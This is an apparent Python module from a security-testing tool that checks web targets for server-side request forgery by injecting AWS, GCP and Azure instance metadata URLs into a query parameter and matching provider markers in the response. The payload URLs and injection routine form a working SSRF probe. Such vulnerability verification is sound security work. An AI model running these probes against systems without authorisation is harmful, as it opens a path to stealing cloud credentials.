"""SSRF→IMDS oracle via cloud instance metadata service endpoints.

Injects cloud metadata service URLs into a query parameter.  If the target
server fetches the IMDS URL on our behalf (SSRF), the response body will
contain cloud-provider-specific markers.

Providers tested (in order):
  1. AWS   — http://169.254.169.254/latest/meta-data/
  2. GCP   — http://metadata.google.internal/computeMetadata/v1/
  3. Azure — http://169.254.169.254/metadata/instance
"""

from __future__ import annotations

import urllib.parse
from typing import Any

import httpx
import structlog

from oracle_mcp.result import OracleResult
from oracle_mcp.security import reject_destructive_payload

log = structlog.get_logger("oracle_mcp.oracles")

# (provider_name, imds_url, markers_to_check_in_body)
_IMDS_ENDPOINTS: list[tuple[str, str, list[str]]] = [
    (
        "aws",
        "http://169.254.169.254/latest/meta-data/",
        ["ami-id", "instance-id"],
    ),
    (
        "gcp",
        "http://metadata.google.internal/computeMetadata/v1/",
        ["email", "project-id"],
    ),
    (
        "azure",
        "http://169.254.169.254/metadata/instance",
        ["azEnvironment", "subscriptionId"],
    ),
]


def _inject_param(url: str, param: str, value: str) -> str:
    """Return *url* with *param* set to *value* in the query string."""
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return parsed._replace(query=new_query).geturl()


async def oracle_ssrf_imds(
    url: str,
    param: str,
    timeout_seconds: float = 10.0,
) -> OracleResult:
    """Verify SSRF→IMDS by injecting cloud metadata endpoints and checking markers.

    Injects each IMDS URL as the value of *param* and GETs the original *url*.
    If the vulnerable server fetches the IMDS URL, its response will be proxied
    back, containing cloud-provider markers.

    Args:
        url: Target URL with *param* as a query-string key (the SSRF injection point).
        param: Query-string parameter to inject the IMDS URL into.
        timeout_seconds: Per-request timeout in seconds.

    Returns:
        :class:`~oracle_mcp.result.OracleResult` with verdict
        ``validated`` or ``unreproducible``.
    """
    reject_destructive_payload(url)

    log.info(
        "ssrf_imds.oracle.start",
        url=url,
        param=param,
        providers=[p for p, _, _ in _IMDS_ENDPOINTS],
    )

    timed_out_count = 0

    async with httpx.AsyncClient(timeout=timeout_seconds) as client:
        for provider, imds_url, markers in _IMDS_ENDPOINTS:
            injected_url = _inject_param(url, param, imds_url)
            log.debug(
                "ssrf_imds.attempt",
                provider=provider,
                imds_url=imds_url,
                injected_url=injected_url,
            )
            try:
                response = await client.get(injected_url)
                body = response.text
                matched_marker: str | None = None
                for marker in markers:
                    if marker in body:
                        matched_marker = marker
                        break

                if matched_marker is not None:
                    evidence: dict[str, Any] = {
                        "provider": provider,
                        "imds_url": imds_url,
                        "marker": matched_marker,
                        "param": param,
                    }
                    log.info(
                        "ssrf_imds.oracle.validated",
                        provider=provider,
                        marker=matched_marker,
                    )
                    return OracleResult(
                        verdict="validated",
                        oracle_method="ssrf_imds_cloud_marker",
                        evidence=evidence,
                    )

            except httpx.TimeoutException:
                timed_out_count += 1
                log.debug("ssrf_imds.timeout", provider=provider)

    log.info(
        "ssrf_imds.oracle.unreproducible",
        timed_out_count=timed_out_count,
        total=len(_IMDS_ENDPOINTS),
    )

    return OracleResult(
        verdict="unreproducible",
        oracle_method="ssrf_imds_cloud_marker",
        evidence={"param": param, "providers_tried": [p for p, _, _ in _IMDS_ENDPOINTS]},
        reason="no cloud metadata marker found in any provider response",
    )
